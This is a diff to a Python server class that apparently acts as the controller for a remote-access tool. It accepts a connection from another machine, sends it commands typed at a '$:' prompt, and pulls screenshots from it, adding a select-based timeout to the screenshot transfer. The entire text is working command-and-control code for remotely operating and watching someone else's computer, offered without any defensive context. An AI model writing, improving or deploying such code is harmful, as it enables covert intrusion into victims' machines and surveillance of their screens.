@@ -2,6 +2,7 @@ import socket
 import subprocess
 import platform
 import os
+import select
 import threading
 
 class Server:
@@ -23,49 +24,56 @@ class Server:
             self.cleanup()
 
     def accept(self):
-        conn = None
+        self.conn = None
         try:
-            conn, addr = self.sock.accept()
-            conn.send(str("name").encode())
-            data = conn.recv(1024).decode(errors='ignore')  # Ignore decoding errors
+            self.conn, self.addr = self.sock.accept()
+            self.conn.send(str("name").encode())
+            data = self.conn.recv(1024).decode(errors='ignore') 
             print(f"Let's welcome '{data}'")
             self.controling = True
-            self.accessing(conn, addr)
+            self.accessing()
         except KeyboardInterrupt:
             self.cleanup()
 
-    def accessing(self, conn, addr):
+    def accessing(self):
         try:
             while self.controling:
                 userInput = input("$: ").lower()
-                conn.send(userInput.encode())
+                self.conn.send(userInput.encode())
                 if userInput == "exit":
                     self.sock.close()
                     exit(0)
 
                 if userInput == "screenshot":
-                    threading.Thread(target=self.receive_screenshot, args=(conn,)).start()
+                    self.receive_screenshot()
 
-                data = conn.recv(1024).decode(errors='ignore')
-                if userInput != "screenshot":  # Avoid printing binary data
-                    print(data)
         except KeyboardInterrupt:
-            self.cleanup(conn)
+            self.cleanup()
 
-    def receive_screenshot(self, conn):
+    def receive_screenshot(self):
         try:
-            file_size = int.from_bytes(conn.recv(4), 'big')
+            file_size = int.from_bytes(self.conn.recv(4), 'big')
+            screenshot_filename = "received_screenshot.png"
             received_size = 0
             screenshot_data = b""
 
-            while received_size < file_size:
-                packet = conn.recv(min(1024, file_size - received_size))
-                if not packet:
-                    break
-                screenshot_data += packet
-                received_size += len(packet)
+            max_seconds = 5  # Set the timeout period in seconds
 
-            screenshot_filename = "received_screenshot.png"
+            if not os.path.exists(screenshot_filename):
+                open(screenshot_filename, "x").close()
+
+            while received_size < file_size:
+                ready = select.select([self.conn], [], [], max_seconds)
+                if ready[0]:
+                    packet = self.conn.recv(min(1024, file_size - received_size))
+                    if not packet:
+                        break
+                    screenshot_data += packet
+                    received_size += len(packet)
+                else:
+                    print("Failed to get screenshot: Timeout exceeded.")
+                    return self.accessing()
+
             with open(screenshot_filename, "wb") as f:
                 f.write(screenshot_data)
 
@@ -83,14 +91,17 @@ class Server:
                     print(f"Unsupported OS: {current_os}. Cannot open the image.")
             except Exception as e:
                 print(f"Failed to open image: {str(e)}")
-        except Exception as e:
-            print(f"Failed to receive screenshot: {str(e)}")    
 
-    def cleanup(self, conn=None):
+            return self.accessing()
+
+        except Exception as e:
+            print(f"Failed to receive screenshot: {str(e)}")
+            return self.accessing()
+    def cleanup(self):
         self.controling = False
 
-        if conn:
-            conn.send("exit".encode())
+        if self.conn:
+            self.conn.send("exit".encode())
         if self.sock:
             self.sock.close()
 
